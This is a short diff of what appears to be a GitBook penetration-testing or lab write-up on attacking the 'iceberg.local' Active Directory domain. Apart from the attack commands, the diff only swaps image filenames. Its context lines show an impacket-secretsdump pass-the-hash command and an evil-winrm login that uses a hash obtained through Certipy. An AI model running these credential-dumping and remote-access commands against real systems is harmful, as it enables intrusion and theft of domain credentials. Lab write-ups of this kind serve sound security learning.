@@ -516,11 +516,11 @@ impacket-secretsdump -hashes :5f754bcffe28b5bb5a1581d9bbd4e98c 'iceberg.local/WI
 
 evil-winrm -i 44.221.50.166 -u 'TARGET\_USER' -H '\<HASH\_FROM\_CERTIPY>'
 
-<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
 Btw, I know is iceberg.local because cannot connect to rdp, then I saw iceberg.local domain.
 
